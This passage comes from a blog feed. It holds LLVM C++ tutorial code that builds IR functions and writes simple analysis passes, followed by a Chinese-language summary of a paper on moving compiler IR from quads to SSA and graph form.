BasicBlock* block = BasicBlock::Create(getGlobalContext(), &quot;entry&quot;, mul_add);</span><br><span class="line">  IRBuilder&lt;&gt; builder(block);</span><br><span class="line">  </span><br><span class="line">  Value* tmp = builder.CreateBinOp(Instruction::Mul,</span><br><span class="line">                                   x, y, &quot;tmp&quot;);</span><br><span class="line">  Value* tmp2 = builder.CreateBinOp(Instruction::Add,</span><br><span class="line">                                    tmp, z, &quot;tmp2&quot;);</span><br><span class="line"></span><br><span class="line">  builder.CreateRet(tmp2);</span><br><span class="line">  </span><br><span class="line">  return mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char**argv) &#123;</span><br><span class="line">  Module* Mod = makeLLVMModule();</span><br><span class="line"></span><br><span class="line">  verifyModule(*Mod, PrintMessageAction);</span><br><span class="line"></span><br><span class="line">  PassManager PM;</span><br><span class="line">  PM.add(createPrintModulePass(&amp;outs()));</span><br><span class="line">  PM.run(*Mod);</span><br><span class="line"></span><br><span class="line">  delete Mod;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>code2:</p><p><note>:llvm 有自动的名称唯一性<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Module* makeLLVMModule() &#123;</span><br><span class="line">    // constract module</span><br><span class="line">    Module* mod = new Module(&quot;test&quot;, getGlobalContext());</span><br><span class="line">    </span><br><span class="line">    // constract func </span><br><span class="line">    Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;,</span><br><span class="line">    /*ret type*/                           IntegerType::get(32),</span><br><span class="line">    /*args*/                               IntegerType::get(32),</span><br><span class="line">                                           IntegerType::get(32),</span><br><span class="line">    /*varargs terminated with null*/       NULL);</span><br><span class="line">    </span><br><span class="line">    // cast this function</span><br><span class="line">    Function* gcd = cast&lt;Function&gt;(c);</span><br><span class="line">    </span><br><span class="line">    //set arg</span><br><span class="line">    Function::arg_iterator args = gcd-&gt;arg_begin();</span><br><span class="line">    Value* x = args++;</span><br><span class="line">    x-&gt;setName(&quot;x&quot;);</span><br><span class="line">    Value* y = args++;</span><br><span class="line">    y-&gt;setName(&quot;y&quot;);</span><br><span class="line">    </span><br><span class="line">    //set basic blocks</span><br><span class="line">    BasicBlock* entry = BasicBlock::Create(getGlobalContext(), (&quot;entry&quot;, gcd);</span><br><span class="line">    BasicBlock* ret = BasicBlock::Create(getGlobalContext(), (&quot;return&quot;, gcd);</span><br><span class="line">    BasicBlock* cond_false = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd);</span><br><span class="line">    BasicBlock* cond_true = BasicBlock::Create(getGlobalContext(), (&quot;cond_true&quot;, gcd);</span><br><span class="line">    BasicBlock* cond_false_2 = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd);</span><br><span class="line">    </span><br><span class="line">    //use  IRBuild to fill the &lt;entry&gt; basicblocks</span><br><span class="line">    IRBuilder&lt;&gt; builder(entry);</span><br><span class="line">    </span><br><span class="line">    //fill</span><br><span class="line">    Value* xEqualsY = builder.CreateICmpEQ(x, y, &quot;tmp&quot;);</span><br><span class="line">    builder.CreateCondBr(xEqualsY, ret, cond_false);</span><br><span class="line">    </span><br><span class="line">    //use &lt;SetInsertPoint&gt; to retarget the targetBB</span><br><span class="line">    builder.SetInsertPoint(ret);</span><br><span class="line">    </span><br><span class="line">    //fill</span><br><span class="line">    builder.CreateRet(x);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    builder.SetInsertPoint(cond_true);</span><br><span class="line">    Value* yMinusX = builder.CreateSub(y, x, &quot;tmp&quot;);</span><br><span class="line">    std::vector&lt;Value*&gt; args1;</span><br><span class="line">    args1.push_back(x);</span><br><span class="line">    args1.push_back(yMinusX);</span><br><span class="line">    Value* recur_1 = builder.CreateCall(gcd, args1.begin(), args1.end(), &quot;tmp&quot;);</span><br><span class="line">    builder.CreateRet(recur_1);</span><br><span class="line">    </span><br><span class="line">    builder.SetInsertPoint(cond_false_2);</span><br><span class="line">    Value* xMinusY = builder.CreateSub(x, y, &quot;tmp&quot;);</span><br><span class="line">    std::vector&lt;Value*&gt; args2;</span><br><span class="line">    args2.push_back(xMinusY);</span><br><span class="line">    args2.push_back(y);</span><br><span class="line">    Value* recur_2 = builder.CreateCall(gcd, args2.begin(), args2.end(), &quot;tmp&quot;);</span><br><span class="line">    builder.CreateRet(recur_2);</span><br><span class="line">    </span><br><span class="line">    return mod;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char**argv) &#123;</span><br><span class="line">  Module* Mod = makeLLVMModule();</span><br><span class="line"></span><br><span class="line">  verifyModule(*Mod, PrintMessageAction);</span><br><span class="line"></span><br><span class="line">  PassManager PM;</span><br><span class="line">  PM.add(createPrintModulePass(&amp;outs()));</span><br><span class="line">  PM.run(*Mod);</span><br><span class="line"></span><br><span class="line">  delete Mod;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></note></p><h3><span id="编写一个稍复杂的pass">编写一个稍复杂的pass</span></h3><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html" target="_blank" rel="noopener">官方文档</a></p><p>code1:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  </span><br><span class="line">  struct IterInsideBB : public FunctionPass &#123;</span><br><span class="line">    static char ID; // Pass identification, replacement for typeid</span><br><span class="line">    IterInsideBB() : FunctionPass(ID) &#123;&#125;  </span><br><span class="line"></span><br><span class="line">    bool runOnFunction(Function &amp;F) override &#123;</span><br><span class="line">    errs() &lt;&lt; &quot;Function name: &quot;;</span><br><span class="line">    errs() &lt;&lt; F.getName() &lt;&lt; &apos;\n&apos;;</span><br><span class="line">    for(Function::iterator bb = F.begin(), e = F.end(); bb!=e; bb++)</span><br><span class="line">    &#123;</span><br><span class="line">    errs()&lt;&lt;&quot;BasicBlock name = &quot;&lt;&lt; bb-&gt;getName() &lt;&lt;&quot;\n&quot;;</span><br><span class="line">    errs()&lt;&lt;&quot;BasicBlock size = &quot;&lt;&lt; bb-&gt;size() &lt;&lt; &quot;\n\n&quot;;</span><br><span class="line"></span><br><span class="line">    for(BasicBlock::iterator i = bb-&gt;begin(), i2 = bb-&gt;end(); i!=i2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    outs()&lt;&lt;&quot;    &quot;&lt;&lt; *i &lt;&lt;&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char IterInsideBB::ID = 0;</span><br><span class="line">static RegisterPass&lt;IterInsideBB&gt; X(&quot;IterInsideBB&quot;, &quot;Iterate inside basicblocks inside a Function&quot;);</span><br></pre></td></tr></table></figure></p><p>code2:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">namespace &#123;</span><br><span class="line">  </span><br><span class="line">  struct UseDef : public FunctionPass &#123;</span><br><span class="line">    static char ID; // Pass identification, replacement for typeid</span><br><span class="line">    UseDef() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    bool runOnFunction(Function &amp;F) override &#123;</span><br><span class="line"></span><br><span class="line">    errs() &lt;&lt; &quot;Function name: &quot;;</span><br><span class="line">    errs() &lt;&lt; F.getName() &lt;&lt; &apos;\n&apos;;</span><br><span class="line">    for(Function::iterator bb = F.begin(), e = F.end(); bb!=e; bb++)</span><br><span class="line">    &#123;</span><br><span class="line">    for(BasicBlock::iterator i = bb-&gt;begin(), i2 = bb-&gt;end(); i!=i2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">                Instruction * inst = dyn_cast&lt;Instruction&gt;(i);</span><br><span class="line">                if(inst-&gt;getOpcode() == Instruction::Add)</span><br><span class="line">                &#123;</span><br><span class="line">                    for(Use &amp;U: inst -&gt; operands())</span><br><span class="line">                    &#123;</span><br><span class="line">                        Value * v = U.get();</span><br><span class="line">                        outs()&lt;&lt; *v &lt;&lt;&quot;\n&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char UseDef::ID = 0;</span><br><span class="line">static RegisterPass&lt;UseDef&gt; X(&quot;UseDef&quot;, &quot;This is use-def Pass&quot;);</span><br></pre></td></tr></table></figure></p><p>v1&lt;-loadint 8<br>v2&lt;-operation add v1, v2</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Analysis-of-libfuzzer-amp-amp-LLVM&quot;&gt;&lt;a href=&quot;#Intro-Analysis-of-libfuzzer-amp-amp-LLVM&quot; class=&quot;headerlink&quot; title=&quot;Intro: Analysis of libfuzzer &amp;amp;&amp;amp; LLVM&quot;&gt;&lt;/a&gt;Intro: Analysis of libfuzzer &amp;amp;&amp;amp; LLVM&lt;/h2&gt;
    
    </summary>
    
      <category term="fuzz" scheme="http://p1umer.gituhb.io/categories/fuzz/"/>
    
    
      <category term="Fuzz" scheme="http://p1umer.gituhb.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>IR&#39;s Journey</title>
    <link href="http://p1umer.gituhb.io/2018/09/03/IR&#39;s-Journey/"/>
    <id>http://p1umer.gituhb.io/2018/09/03/IR&#39;s-Journey/</id>
    <published>2018-09-03T15:43:55.000Z</published>
    <updated>2019-07-04T16:35:57.681Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-from-quads-to-graphs">Intro: From Quads to Graphs</span></h2> <a id="more"></a><h3><span id="1-介绍">1 介绍</span></h3><p>中间语言不是凭空产生的。中间语言是程序员的表述到具体的机器代码的转换辅助，而且必须弥合大量的语义差异，例如从一个 fortran 90 的机器码操作到一个三地址码表述的 add 语句。在高级语言到机器语言的转化过程中，一个优化编译器会执行很多次的 pass 来优化 IR 。使用者希望优化编译器能把这一过程执行的迅速而又准确；而编译器的编写者则希望优化代码能够尽可能的简单易懂且便于维护。我们的目标是设计轻量级的 IR 来使得简单语句可以得到快速优化。</p><p>本文讲述了中间语言从 quad-based form 到 graph-based form 的转化历程。转化的最终格式类似于(当然不是完全相同)一个 operator-level 的 Program Dependence Graph 或者说是 Gated Single Assignment。最终的形式包含执行程序所需要的所有信息。更重要的是，这种图表形式明确地包含 use-def 信息，分析过程中可以直接使用此信息而无需计算。分析过程中 Transformation 会直接在 IR 的基础上修改 use-def 信息，而无需额外的步骤。这种形式的的 graph 是一维的结构，而不是像 CFG 包含两个维度（分别是 basic blocks 和 instructions）。这种一维结构可以在我们的算法中体现出来。</p><p>使编译器快速运行的一个原则是尽可能早地完成尽可能多的工作。这引导我们在 one-pass 的前端加入强大的窥孔优化。我们设计的 IR 允许施行窥孔优化，在某种情况下，这种做法可以和 pessimistic conditional constant propagation 起到相同的效果。</p><p>【窥孔优化】：</p><ul><li>一种很局部的优化方式，编译器仅仅在一个基本块或者多个基本块中，针对已经生成的代码，结合CPU自己指令的特点，通过一些认为可能带来性能提升的转换规则，或者通过整体的分析，通过指令转换，提升代码性能。</li></ul><p>【稀疏有条件的常数传播】：</p><ul><li>稀疏有条件的常数传播（sparse conditional constant propagation）是一个优化的技术，常用在以静态单赋值形式（SSA）进行最佳化的编译器，它可以移除 dead code elimination 以及进行 constant propagation。</li></ul><p>【常数传播】：</p><ul><li>编译原理课上的常数替换优化</li></ul><p>本文不是关于如何写成一个完整的编译器，而是分享一种设计思路，可以从传统的 IR 过渡到 graph-based IR。</p><h4><span id="11-pessimistic-vs-optimistic">1.1 Pessimistic-vs-Optimistic</span></h4><p>我们将分析（和转换）分为两大类：Pessimistic &amp; Optimistic。Pessimistic analyses 假设了一种最坏的状况（conservatively correct）并且尝试去证明，而 Optimistic analyses 假设了一种最好地状况。处理“循环”外的情形中，这两种技术产生的结果相同。而在处理“循环”的过程中，Optimistic analyses 会假设一些从循环的 back edge 中产生的“fact”成立，在之后的步骤中可能会得到证明；而 Pessimistic techniques 则在循环进行中不产生任何假设，只使用已经确定的条件。这可能不能产生 do not already have 的事实。</p><p>举个栗子，在常数传播*(上面介绍过)的过程中，optimistic analysis 先假设循环 back edge 上的一些 def_value 等价于 constant，如果假设被证明成立，则可以进行一次 constant propagation。如果假设不成立，也没有害处啊2333…循环体只需要结合更加保守的 information 进行重新分析就可以了。</p><p>而针对 Pessimistic analysis，循环 back-edge 的 def_values 都被看作为变量，当这些所谓的“变量”与 loop 中的常量合并时，根据已有的信息分析器只能确定该个变量是个变量，符合了一开始的假设，因此这种分析无法找到更多的常量。</p><p>但是，如果没有循环，两种分析都可以访问包含所有已有 fact 的代码，也就是说，两种分析都可以找到一组等价的 facts。为了有效地做到这一点，分析需要按拓扑顺序访问代码；且关于特定值的信息必须在使用该值之前收集。如果无序访问代码，则一些分析必须在没有所有相关 fact 的情况下进行。在这种情况下，我们发现 Pessimistic analysis 可以在 one-pass 算法中可以 usefully proceed，因为缺少信息的条件下编译器做出的假设（或者说是具体的优化）会较为保守，而针对 Optimistic analysis 我们必须反复 visit 该块无序代码来验证那些较为积极但“危险”的假设。</p><h4><span id="12-optimizations-in-the-front-end">1.2 Optimizations-in-the-Front-End</span></h4><p>由于我们可以在 one-pass 算法中进行 Pessimistic analysis ，因此我们可以在 Parseing 时执行此操作。当前端解析表达式时，分析器会为表达式指定一个保守值，并尝试根据以前解析的表达式来产生更好的 Parse 结果。只要解析器以拓扑顺序 Parse 代码，Pessimistic analysis 就像 optimistic analysis 一样好。我们观察到 Parser 按照拓扑顺序访问使用 if / then / else 结构构建的代码，在循环头或非结构化代码中，Pessimistic analysis 做出了保守正确的假设，这是非常令人开心的。</p><p>Pessimistic analysis 只需要我们在 Parse 代码时收集的 use-def 信息。编译器查看（并更改）包含某段 IR 的固定 region，在该块 region 外的区域代码在前者的产生和优化（transform）过程中不受影响。region 内的 IR 的转换同样也不依靠其他 IR_region 的信息。类似于窥孔优化的加强版。</p><p>通过在 Parse 中加入 Pessimistic analysis ，我们降低了整个程序的大小，而且减轻了后续优化阶段的工作量。（程序大小的缩减是因为我们通过 Pessimistic analysis 用一些新指令替换了原有的指令，后续优化阶段工作量的减少是由于我们提前完成了）</p><p>【use-def】：</p><ul><li>links at a value’s use site to the value’s definition sites</li></ul><h4><span id="13-overview">1.3 Overview</span></h4><ul><li>Section 2：从带有基本指令块的传统CFG开始；</li><li>Section 3：将这种表示适配到有明确的 use-def 信息的 SSA 格式</li><li>Section 4：再在其中加入控制依赖（control dependencies）</li><li>Section 5：使用C++的继承为我们的指令提供更多结构并加速其创建和删除</li><li>Section 6：完全放弃CFG，取而代之的是处理 control 的指令</li><li>Section 7：增强的窥孔优化</li><li>Section 8：讨论如何处理各种 problematic 的指令特性（effect chain &amp; memory dependence 以后有时间总结）</li><li>Section 9：删除所有 control 信息</li><li>Section A：lookat 基于终态 IR 的强大的 optimistic transformations </li></ul><p>当我们在“进化”IR 时，我们也要“进化” pessimistic transformation technique，而且它最终会变成一种极其简单高效的优化技术，仅仅在分析循环和非结构化代码时较弱于 optimistic analysis。</p><h3><span id="2-in-the-beginning">2 In-the-Beginning</span></h3><p>让我们来具体看看CFG。CFG 是一个有向图，其节点是 basic blocks，边表示 control flow。Figure 1 表示了基本块的实现，是一个双层壳结构。CFG 包含了两个特殊块分别是没有输入的 Start block 和没有输出的 Stop block。每个 Basic block 包含有序的 instr 列表。每条指令都是一个四元组：opcode、目标变量和两个源变量。当然有时候源变量数量可能是 0~3 不等（这种情况就不叫四元组了）。四元组的实现在 Figure 2 中，是一个单维结构：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002632.png" alt></p><p>在四元组指令的具体表示中，opcode 通常占用 1~4 个字节。每个变量都被重命名为一个相当密集的 machine integer，作为符号表的索引。源变量和操作码一起称为表达式。该四元组可能还包含指向当前 Basic Blocks 的下一个四元组的指针。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002727.png" alt></p><p>粗略地说，基本块的语义如下所示</p><ul><li>每条指令都是按顺序执行的</li><li>指令的执行包括：<ul><li>解析所有源变量</li><li>在这些源上执行 opcode 指定的原语</li><li>将结果赋给目标变量</li></ul></li><li>Basic block 的最后一条指令，不是写入目标变量，而是读取条件代码寄存器，并决定下面几个基块中的哪一个要执行（Jump condition）。</li><li>Stop 块的最后一条指令必须包含 Return_opcode。</li><li>start 块的第一条指令可以使用程序外部指定的 source（程序的输入）。</li></ul><p>其余 IR 拓展功能按需添加。特别是子程序调用、内存（Load，Store）和 I/O 等等将进一步处理。</p><h4><span id="21-pessimistic-transformations-on-quads">2.1 Pessimistic Transformations on Quads</span></h4><p>到目前为止，四元组仍然缺少所有的 use-def 信息，即：A 指令中用到的变量由哪条指令进行赋值？在应用 use-def 信息之前，窥孔优化仅仅依赖于一个固定大小的指令窗口来检查和转换。该技术非常薄弱，因为其依赖【指令顺序】来”确保”变量的使用接近于变量定义，这是不严谨的。所有现代的编译技术都依赖于 use-def 信息，无论是局部（在基本块中）还是全局（在过程中）。</p><p>我们可以考虑将 Parse（甚至四元组的 generate ）和 pessimistic optimizations 进行融合。During Parse，前端生成 basic blocks 和 instr。在生成 instr_A 时，前端立即在此 Block 中的前一个指令的上下文中检查指令，并立即进行窥孔优化，在 context window 中执行 instructions transform。Figure 3 展示了一种 during-parse 的窥孔优化。加入 use-def 信息等效于 context window 的拓展，允许非相邻代码的该类优化。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002811.png" alt></p><h4><span id="22-use-def-information">2.2 Use-Def Information</span></h4><p>显然，use-def 信息将极大地改善我们的窥视孔优化。不仅如此，Use-def 信息对许多其他类型的优化也很有用。use-def 信息没必要和 source 变量名一起储存，仅依靠源变量名信息就足以生成 use-def chains。我们只需要在四元组中向后搜索就能找到 def 指令。但是，向后搜索可能很慢（程序大小呈线性）。更糟糕的是，向后搜索可能得到模糊的结果，因为程序中可能存在多种 def 可以 reach 相同的 use。为了解决这个问题，我们引入 SSA。</p><h3><span id="3-static-single-assignment">3 Static Single Assignment</span></h3><p>适配 SSA 可以消除模糊的目标定义。在一个普通的程序中，一个变量可以沿着不同的控制路径（control path），或者说在不同的 basic block 中被多次定义。而在被转换为 SSA 形式时，某些 basic blocks 的头部会插入 Φ-function （在 4.1 中会具体描述），然后对所有的变量进行重命名。 Φ-function 被当作普通的的 instr 执行；且 Φ-function 的 opcode 与其他函数不同。Figure 4 展示了符合 SSA 的示例代码：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002825.png" alt></p><p>在重命名步骤之后，每个变量都精确地分配一次。且由于表达式只出现在赋值的右边，所以每个表达式都与一个变量（左值）相关联。也就是说，变量和表达式之间存在一对一的关联。因此，变量名可以当作“定义它的表达式”的直接映射（direct map）。 在我们的实现中，我们希望这种映射（mapping）越快越好。</p><p>在指令的具体实现中，我们会设计一个 field 用来存储源变量的名称（已经表示为 machine integers）。为了加快变量到定义的映射，我们用“指向变量定义指令的指针”（一个指向 instr 数据结构的指针）替换变量名。现在，执行从变量名到定义指令的映射需要单个指针，在这种方式下，use-def 链是显式编码的。Figure 5 展示了这种新的指令格式：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002918.png" alt></p><p>我们现在有一个从变量和表达式到指令的来回抽象映射。这意味着我们不需要额外的指令来对已经定义的变量名进行编码——转而使用上述的映射关系即可。因此可以删除 dst 字段（优化的时候不再需要具体的左值信息，仅依赖于 use-def ）。但是，During Parsing，前端也需要从变量名称到指令的映射（前端的变量名称表现为 machine integet）。于是需要 vn 到 instr 的映射表（parse 过程）。考虑到已经存在 vn -&gt; integer 的映射，我们需要构建一个 integer -&gt; instr 的映射。每次窥孔优化后我们都会更新该 map。</p><p>Figure 6 展示了新的 Parser 接口。由于现在我们使用的是 use-def 信息而不是 context window，因此我们不再需要 prev 指针。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002934.png" alt></p><p>【note】这里的 dst &amp; src 都是 integer ，并且对 instr 隔离。</p><h4><span id="31-building-ssa-form">3.1 Building SSA Form</span></h4><p>我们现在使用相对保守的方法来构建 SSA。我们的方法不需要分析整个程序，当然，在我们仍在 Parse 程序时这也是不可行的。变量的每个定义都被重命名为定义指令的地址（vn-&gt;instr | line 5），而且每个原始变量都映射到一个 integer 索引（vn:integer | line 3&amp;4），我们在索引的基础上使用一个简单数组来映射 def（ ==arr_of_mapping==[integer]=def | line 3&amp;4）。当我们找到现有变量的新定义时，我们更新 ==arr_of_mapping==.</p><p>在每个 Basic Block 的开头，如果我们将要处理同一个变量的两个定义时，我们就会插入 Φ-function。在嵌套的 if / then / else 结构中，我们将解析所有通向 merge point 的路径。然后检查所有变量以更改定义并且按照需求插入 Φ-function。在 loop head 和 labels 位置，我们必须先假设所有变量都定义在我们尚未解析的路径上，这造成我们需要插入很多冗杂的 Φ-function 。但该算法依然很快。</p><h4><span id="32-pessimistic-optimizations-with-use-def-information">3.2 Pessimistic Optimizations with Use-Def Information</span></h4><p>现在 use-def 信息已经嵌入到 IR 中。有了这些信息，我们就可以分析相关指令，而不管它们的顺序如何（也就是可以放弃context window ？maybe），而且这种分析会比以往更加有效。Figure 7 展示了我们使用 use-def 信息的一个窥孔优化实例：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002949.png" alt></p><p>【参考 Figure 5 加速理解】</p><p>（during codegen当一条指令的状态是 unused （not codegen），我们总是返回一些 replace指令。replacement_instr 可以是之前定义的指令（可以理解为use original def ）。使用以前定义的指令而不是创建一个新的指令会缩小我们的代码大小（好像同时也会减轻优化的工作量）。我们下面列举了一下优化：</p><ul><li>Removing copies: 直接使用原始值而不是 copy。</li><li>Adding two constants：通常来说，只要原语的 source 均为constant，那么在编译时就可以把结果直接优化为 constant，也就是依靠计算机的机器指令来优化。</li><li>Adding a zero: not add，use original</li><li>Value-numbering: value 编码会帮我们删除一些等效表达式，like line 5_if。所使用的方法是哈希表查找，其中 key 是从 data-input（or src）和 opcode 中计算出来的。因为我们 instr 结构中没有任何 control-data，我们可能会得到两个等价的但是毫不相关的表达式（不同的 control-path）。这种情况下，简单的 replace 就颇为不妥。为了修复这个问题，我们需要在每个 Basic Block 的末尾都刷新一遍 hash table。</li><li>Subtracting equal inputs:</li></ul><h4><span id="33-progress">3.3 Progress</span></h4><p>我们取得了很大的进展，不仅从instr_format中删除了 dst 字段，而且收集了 use-def 信息以供以后的 passes，并加强、加速了窥孔优化。然而，我们可以 do better。对于基本块中的指令，我们仍然有一个固定的顺序，操作逻辑还是依赖于 ==next== field。然而，当一个 Basic Blocks 被执行时，块中的所有指令都被执行。而对于超标量或 data-flow 机器，只要它们的 input dependencies 得到满足，就应该允许以任何顺序执行指令。 要纠正这一点，我们需要考虑指令是如何排序的。</p><h3><span id="4-control-flow-dependence">4 Control-Flow-Dependence</span></h3><p>在到目前为止描述的 IR 中，基本块包含有序的指令列表。在某种意义上，这代表了 def-use 控制信息。basic block 从某种程度上 define 了control-flow，然后 instr uses that control。我们需要做的是抛开 basic block 这种隐式 control flow，转而为每一个 instr 建立相应的 control data。消除串行化控制依赖关系允许在 Block 中的 instr 可以不按顺序执行，只要它们的其他数据依赖关系得到满足即可。此外，我们希望这种数据关系与我们的依赖表示保持一致，并显式地使用 use-def 信息而不是 def-use 信息。</p><p>基本块中指令的有序列表被表示为 linked list 形式。每条指令都包含指向下一条指令的指针。我们用一个指向 Basci Blocks 结构本身的指针替换这个 next pointer，并将此指针视为指令的另一个 source of input：the control source。此时，每条指令都有 0~3 个数据输入和一个 control input。Figure 8 描述了这种新的结构。在该示例中，我们仅展示了一个基本块，但其中的 data inputs 可以位于任何基本块。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003005.png" alt></p><p>【左侧指针代表 control】</p><h4><span id="41-more-on-φ-functions">4.1 More-on-Φ-Functions</span></h4><p>首先明确什么是 Φ-Functions。举个栗子：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003022.png" alt><br>这是一个适配了 SSA 的 CFG。现在面临的问题是：</p><ul><li>W2 &amp; Z1 的 Y_source是那条路经上的？</li></ul><p>因此我们引入 Φ-Functions ：这个函数将分析控制流信息，通过选择y1或y2来生成y的新定义y3。</p><p>也就是这样：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003038.png" alt></p><p>—介绍结束</p><p>我们依然需要 CFG 的 edges 来帮助判断“模糊节点”并在其中加入 Φ-Functions。我们需要将来自相应基本块的 control input 与 Φ-instr 的每个 data input 相关联。这样做意味着 Φ-instr 将具有一组 input pair（two element）：分别是 control dependence 和 data dependence。这种具有复杂语义的结构显得很笨拙。下面我们看一种全新的结构。</p><p>我们将 Φ-instr 拆分成<strong>一组</strong> Select 指令和<strong>一个</strong> Compose 指令，每个指令都有简单的语义。Select 有两个 input： control dependence 和 data dependence。Select 计算的结果取决于 control。如果 control source 没有被执行，也就是说对应的 Basic Block 没有被 exec，那么不产生任何 value 结果。否则，data value 将被 pass up（自造词组2333）。紧接着，Compose 将 Select 的所有结果作为 input，并且 pass up 产生 value 的 Select 的结果。如 Figure 9 所示：</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705003054.png" alt></p><p>WARMMING!!!这些指令（Select &amp; so on）没有 Run-time 操作,而且它们不是机器指令。它们的存在仅是为了帮助编译器理解程序语义。当最终的机器代码被fully generated，Select / Compose序列将被 folded back 回 basic blocks &amp; CFG。</p><h4><span id="42-cleanup">4.2 Cleanup</span></h4><p>此时我们的 instr 已经较为完美了，其 use-def 信息包含了 data 和 control（针对use-def-of-control，可以理解为常规控制流图反过来的逻辑链）。另外，我们还有足够的信息保证 IR 的可加工性（<del>因此很容易修改，例如，merge dead path</del>）。但是，我们现有的的 Inst 类很难很好的抽象出各种不同的指令。我们将在下一节中讨论这个问题。</p><h3><span id="5-engineering-concerns">5 Engineering-Concerns</span></h3><p>我们注意到我们可以有好多不同的指令，每一种指令都有不同数量的 input。像 Compose 指令，可能有任意数量的输入；Negate 指令只有一个 input；而 Constant 指令（定义 one simple int）需要保存正在定义的 constant 的值，且没有其他的 input。为了处理所有这些差异，我们将 instrument 的定义分解为单独的、继承自基类 